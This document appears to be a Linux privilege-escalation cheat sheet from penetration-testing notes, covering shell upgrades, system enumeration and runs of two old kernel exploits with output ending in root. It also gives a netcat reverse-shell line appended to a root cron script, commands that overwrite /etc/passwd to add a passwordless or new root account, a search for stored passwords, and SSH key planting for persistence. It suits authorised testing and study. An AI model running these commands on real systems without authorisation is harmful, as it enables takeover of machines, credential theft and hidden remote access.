# Linux Privilege Escalation

## Upgrade Shell

[PayloadsAllTheThings: Spawn TTY Shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#spawn-tty-shell)

### Spawning a TTY Shell

=== "python"

	``` bash
	python -c 'import pty; pty.spawn("/bin/sh")'
	```

	``` bash
	python3 -c 'import pty; pty.spawn("/bin/sh")'
	```

=== "script"

	``` bash
	/usr/bin/script -qc /bin/sh /dev/null
	```

=== "perl"

	``` bash
	perl -e 'exec "/bin/sh";'
	```

	``` bash
	perl: exec "/bin/sh";
	```

=== "ruby"

	``` bash
	ruby: exec "/bin/sh"
	```

=== "os.system"

	``` bash
	echo os.system('/bin/bash')
	```

=== "sh -i"

	``` bash
	/bin/sh -i
	```

=== "lua"

	``` bash
	lua: os.execute('/bin/sh')
	```

=== "In an editor"

	(From within IRB)

	``` bash
	exec "/bin/sh"
	```

	(From within vi)

	``` bash
	:!bash
	```

	(From within vi)

	``` bash
	:set shell=/bin/bash:shell
	```

	(From within nmap)

	``` bash
	!sh
	```

### Export Terminal

``` bash
export TERM=xterm
```

^Z

``` bash
stty raw -echo; fg
```

``` bash
stty rows 42 columns 172
```

## User Enumeration

Current User

``` bash
hostname && whoami && id
```

Which ones have a valid shell

``` bash
grep -vE "nologin|false" /etc/passwd
```

Folder

``` bash
pwd; ls -la
```

## OS & Architecture & Kernel

Kernel version and Architecture

``` bash
uname -a
```

``` bash
cat /etc/issue; uname -r; arch
```

What's the OS?

``` bash
cat /etc/*-release
```

``` bash
lsb_release -a (Debian based OSs)
```

Drivers & Kernel Modules

``` bash
lsmod
```

``` bash
/sbin/modinfo <name>
```

### Compile exploit in C/C++

=== "Compile file"

	``` bash
	$ gcc -m32 Size.c -o x86-S
	```

	``` bash
	$ ./x86-S
	Size = 4 
	```

	``` bash
	$ gcc Size.c -o x64-S
	```

	``` bash
	$ ./x64-S
	Size = 8
	```

=== "File Size.c"

	``` c
	#include<stdio.h>
	int main()
	{
	        printf("Size = %lu", sizeof(size_t));
	}
	```

### <= 2.6.36-rc8 - 'RDS Protocol'

``` bash
www-data@ip:/tmp$ uname -a
Linux ip 2.6.32-21-generic #32-Ubuntu SMP Fri Apr 16 08:10:02 UTC 2010 i686 GNU/Linux
```

[https://fareedfauzi.gitbook.io/oscp-notes/linux-post-exploitation/linux-exploitation#exploits-worth-running](https://fareedfauzi.gitbook.io/oscp-notes/linux-post-exploitation/linux-exploitation#exploits-worth-running)

[https://www.exploit-db.com/raw/15285](https://www.exploit-db.com/raw/15285)

``` bash
gcc -m32 15285.c -o 15285
```

``` bash
www-data@ip:/tmp$ ./15285
[*] Linux kernel >= 2.6.30 RDS socket exploit
[*] by Dan Rosenberg
[*] Resolving kernel addresses...
 [+] Resolved security_ops to 0xc08c8c2c
 [+] Resolved default_security_ops to 0xc0773300
 [+] Resolved cap_ptrace_traceme to 0xc02f3dc0
 [+] Resolved commit_creds to 0xc016dcc0
 [+] Resolved prepare_kernel_cred to 0xc016e000
[*] Overwriting security ops...
[*] Overwriting function pointer...
[*] Triggering payload...
[*] Restoring function pointer...
[*] Got root!
# id
uid=0(root) gid=0(root)
```

### <= 2.6.37 'Full-Nelson.

```
www-data@popcorn:/home/george$ uname -a
Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux
www-data@popcorn:/home/george$ cat /etc/issue
cat /etc/issue
Ubuntu 9.10 \n \l
```

[https://www.exploit-db.com/exploits/15704](https://www.exploit-db.com/exploits/15704)

```
www-data@popcorn:/var/www$ gcc 15704.c -o 15704
gcc 15704.c -o 15704
www-data@popcorn:/var/www$ chmod +x 15704
chmod +x 15704
www-data@popcorn:/var/www$ ./15704
./15704
[*] Resolving kernel addresses...
 [+] Resolved econet_ioctl to 0xf846a280
 [+] Resolved econet_ops to 0xf846a360
 [+] Resolved commit_creds to 0xc01645d0
 [+] Resolved prepare_kernel_cred to 0xc01647d0
[*] Calculating target...
[*] Failed to set Econet address.
[*] Triggering payload...
[*] Got root!
# whoami
whoami
root
# 
```

## Processes and Services

``` bash
ps axu
```

[How to check if port is in use in](https://www.cyberciti.biz/faq/unix-linux-check-if-port-is-in-use-command/)

``` bash
sudo lsof -i -P -n | grep LISTEN
```

[List all enabled services from systemctl](https://askubuntu.com/questions/795226/how-to-list-all-enabled-services-from-systemctl)

``` bash
systemctl list-unit-files | grep enabled
```

## Check sudo access 

``` bash
$ sudo -l
[sudo] password for Hades: 
Matching Defaults entries for pentesterlab on 7358cafc3ebe:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
User Hades may run the following commands:
    (victim) /bin/bash
```

Mix cp/chown and chmod

https://www.adampalmer.me/iodigitalsec/2009/10/03/linux-c-setuid-setgid-tutorial/

https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/

``` bash
sudo -l
Matching Defaults entries for Hades:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
User Hades may run the following commands:
    (victim) /bin/chmod, /bin/cp
```

## Scheduled Tasks

``` bash
ls -lah /etc/cron*
```

``` bash
cat /etc/crontab
```

``` bash
grep "CRON" /var/log/* 2>/dev/null
```

### Cronjob file insecure

Cronjob file check.sh overwrite

``` bash
grep "CRON" /var/log/* 2>/dev/null
```

File check.sh running as root every 1 minute.

``` bash
ls -l check.sh
```

Can change file check.sh with user permission.

``` bash
echo "rm /tmp/f; mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ip port >/tmp/f" >> check.sh
```

## Readable/Writable

``` bash
find / -writable -type d 2>/dev/null
```

``` bash
find / -writable 2>/dev/null
```

### File /etc/passwd

File /etc/passwd can be modify by user permission.

``` bash
ls -l /etc/passwd
-rw-rw-rw- 1 root root <snip> /etc/passwd
```

`U6aMy0wojraho` : non password.

``` bash
sed 's/root:x:/root:U6aMy0wojraho:/' /etc/passwd > passwd
cat passwd > /etc/passwd
su
```

Generate password for new user

``` bash
openssl passwd -1 -salt hades leecybersec
```

``` bash
echo toor:$1$hades$KKCtexC.plAyjcJkX7War0:0:0:root:/root:/bin/bash >> /etc/passwd
```

[https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation](https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation)

## Binaries That AutoElevate

``` bash
find / -perm -u=s -type f -exec ls -l {} \; 2>/dev/null
```

## Docker container

``` bash
root@315d7648a173:/# ls -lah
<snip>
-rwxr-xr-x   1 root root    0 Jun  9 13:01 .dockerenv
```

Mount disk to docker machine.

``` bash
mkdir -p /mnt/hola
```

``` bash
mount /dev/sda1 /mnt/hola
mount /dev/sda2 /mnt/hola
mount /dev/sda3 /mnt/hola
```

## Installed and Patch Levels

``` bash
dpkg -l (Debian based OSs)
```

``` bash
rpm -qa (CentOS / openSUSE )
```

``` bash
uname -a
```

## Networking Enumeration

### Interface and Routable

``` bash
ip a
```

``` bash
/sbin/route
```

### Active network connection

``` bash
ss -anp
```

``` bash
netstat -antup
```

## Firewall and Rules

``` bash
grep -Hs iptables /etc/*
```

## Unmounted Disks

List all mounted files system

``` bash
mount
```

``` bash
cat /etc/fstab
```

List all disk

``` bash
/bin/lsblk
```

Mount disk

``` bash
sudo mount -o nolock 192.168.11.131:/share ~/share
```

## Enumeration Tools

<a href='https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/' target="blank">Basic Linux Privilege Escalation</a>

<a href='https://gtfobins.github.io/' target="blank">https://gtfobins.github.io</a>

<a href='https://github.com/DominicBreuker/pspy' target="blank">https://github.com/DominicBreuker/pspy</a>

[https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)

[https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)

[http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)

## More Commands

### history, bashrc, backup

``` bash
find / -name *history* 2>/dev/null
find / -name *backup* 2>/dev/null
find / -name *bashrc* -exec grep passwod {} \; 2>/dev/null
```

### <a href='https://www.ssh.com/ssh/tunneling/example' target="blank">Port Tunneling</a>

Local Tunneling

``` bash
ssh -L $myport:127.0.0.1:5985 hades@192.168.11.133 -i id_rsa
```

Remote Tunneling

``` bash
ssh -R $myip:$myport:127.0.0.1:5985 kali@$myip -i kali-idrsa
```

SSH ESCAPE CHARACTERS

`~C` to type ssh command

### Generate SSH Key

``` bash
ssh-keygen -t rsa
```

``` bash
cp id_rsa.pub authorized_keys
```